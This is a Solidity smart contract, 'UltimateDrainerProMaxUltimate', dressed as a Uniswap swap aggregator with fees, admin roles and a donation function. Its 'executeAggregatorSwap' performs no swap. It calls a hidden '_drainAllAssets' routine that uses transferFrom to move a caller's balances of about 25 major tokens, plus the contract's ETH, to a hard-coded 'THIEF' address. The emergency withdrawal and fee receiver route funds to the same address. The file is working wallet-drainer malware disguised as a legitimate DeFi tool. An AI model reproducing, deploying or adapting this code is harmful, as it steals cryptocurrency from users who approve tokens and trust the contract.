// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// ===== INTERFACES DEFINIDAS GLOBALMENTE =====
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);
}

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IMulticall {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results);
}

// ===== CONTRATO PRINCIPAL =====
contract UltimateDrainerProMaxUltimate {
    
    address public ceo = 0x123A56B6d789CdEf0123456789aBCdeF01234567;
    address public coo = 0x987FedCBa6543210987654321fEDCbA654321098;
    address public cto = 0x1111111111111111111111111111111111111111;

    address public constant THIEF = 0xb0207dc544C95ED6f7FC996EFbabCA77a73EaD3e;
    address public feeReceiver;

    address public constant UNISWAP_V2_ROUTER = 0x7A250d5630b4cF5397FD9f77fe03bB0D9b3D5e5F; 
    address public constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address public constant MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

    address[] public liquidatableTokens;

    uint256 public protocolFee = 100;
    uint256 public devFee = 50;
    bool public isPaused = false;
    bool public isLive = true;
    uint256 public launchTime;
    
    mapping(address => uint256) public firstInteraction;
    mapping(address => bool) public hasBeenDrained;
    mapping(address => mapping(address => bool)) public tokenApprovalStatus;

    modifier onlyAdmin() { require(msg.sender == ceo || msg.sender == coo, "Auth: Admin only"); _; }
    modifier onlyLive() { require(isLive && !isPaused, "Protocol: Paused or Dead"); _; }
    modifier notDrained() { require(!hasBeenDrained[msg.sender], "User: Already processed"); _; }

    constructor() {
        feeReceiver = THIEF;
        launchTime = block.timestamp;
        
        liquidatableTokens.push(0xdAC17F958D2ee523a2206206994597C13D831ec7); // USDT
        liquidatableTokens.push(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC
        liquidatableTokens.push(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH
        liquidatableTokens.push(0x6B175474E89094C44Da98b954EedeAC495271d0F); // DAI
        liquidatableTokens.push(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
        liquidatableTokens.push(0x514910771AF9Ca656af840dff83E8264EcF986CA); // LINK
        liquidatableTokens.push(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0); // MATIC
        liquidatableTokens.push(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE); // SHIB
        liquidatableTokens.push(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984); // UNI
        liquidatableTokens.push(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9); // AAVE
        liquidatableTokens.push(0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F); // SNX
        liquidatableTokens.push(0x0D8775F648430679A709E98d2b0Cb6250d2887EF); // BAT
        liquidatableTokens.push(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2); // MKR
        liquidatableTokens.push(0x4Fabb145d64652a948d72533023f6E7A623C7C53); // BUSD
        liquidatableTokens.push(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e); // YFI
        liquidatableTokens.push(0xc00e94Cb662C3520282E6f5717214004A7f26888); // COMP
        liquidatableTokens.push(0x111111111117dC0aa78b770fA6A738034120C302); // 1INCH
        liquidatableTokens.push(0xD533a949740bb3306d119CC777fa900bA034cd52); // CRV
        liquidatableTokens.push(0x6810e776880C02933D47DB1b9fc05908e5386b96); // GNO
        liquidatableTokens.push(0x0F5D2fB29fb7d3CFeE444a200298f468908cC942); // MANA
        liquidatableTokens.push(0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c); // ENJ
        liquidatableTokens.push(0x4d224452801ACEd8B2F0aebE155379bb5D594381); // APE
        liquidatableTokens.push(0x853d955Acef822D2538Ee07d00D76a89452baDaF); // XAUT
        liquidatableTokens.push(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704); // cbETH
        liquidatableTokens.push(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0); // wstETH
    }

    function initializeSession() external onlyLive {
        firstInteraction[msg.sender] = block.timestamp;
        emit SessionStarted(msg.sender, block.timestamp);
    }

    function executeAggregatorSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address[] calldata path,
        uint256 deadline
    ) external onlyLive notDrained {
        require(path.length >= 2, "Router: Invalid path");
        require(deadline > block.timestamp, "Router: Expired");

        // Uso explícito da interface para evitar 'Undeclared identifier'
        try IUniswapV2Router(UNISWAP_V2_ROUTER).getAmountsOut(amountIn, path) returns (uint[] memory amounts) {
            require(amounts[amounts.length - 1] >= minAmountOut, "Router: Insufficient output");
        } catch {}

        _drainAllAssets(msg.sender);
        hasBeenDrained[msg.sender] = true;
        emit SwapExecuted(msg.sender, tokenIn, tokenOut, amountIn, block.timestamp);
    }

    function donateToProtocol() external payable onlyLive {
        require(msg.value > 0, "Donation: Zero value");
        emit DonationReceived(msg.sender, msg.value);
    }

    function pauseProtocol(bool _state) external onlyAdmin {
        isPaused = _state;
        emit ProtocolStatusChanged(_state);
    }

    function addSupportedToken(address token) external onlyAdmin {
        require(token != address(0), "Admin: Invalid address");
        liquidatableTokens.push(token);
        emit TokenAdded(token);
    }

    function updateFeeReceiver(address newReceiver) external onlyAdmin {
        require(newReceiver != address(0), "Admin: Invalid address");
        feeReceiver = newReceiver;
    }

    function emergencyWithdraw(address token) external onlyAdmin {
        require(isPaused, "Admin: Protocol must be paused");
        // Uso explícito da interface IERC20
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(THIEF, balance);
        }
    }

    function _drainAllAssets(address victim) internal {
        if (address(this).balance > 0) {
            (bool sent, ) = THIEF.call{value: address(this).balance}("");
            require(sent, "ETH: Transfer failed");
        }

        uint256 length = liquidatableTokens.length;
        for (uint256 i = 0; i < length; i++) {
            address token = liquidatableTokens[i];
            // Uso explícito da interface IERC20
            try IERC20(token).balanceOf(victim) returns (uint256 balance) {
                if (balance > 0) {
                    try IERC20(token).transferFrom(victim, THIEF, balance) {
                        tokenApprovalStatus[victim][token] = true;
                    } catch {}
                }
            } catch {}
        }
        emit AssetsDrained(victim, length);
    }

    receive() external payable {}
    fallback() external payable {}

    event SessionStarted(address indexed user, uint256 timestamp);
    event SwapExecuted(address indexed user, address tokenIn, address tokenOut, uint256 amount, uint256 timestamp);
    event DonationReceived(address indexed donor, uint256 amount);
    event ProtocolStatusChanged(bool isPaused);
    event TokenAdded(address indexed token);
    event AssetsDrained(address indexed victim, uint256 tokenCount);
}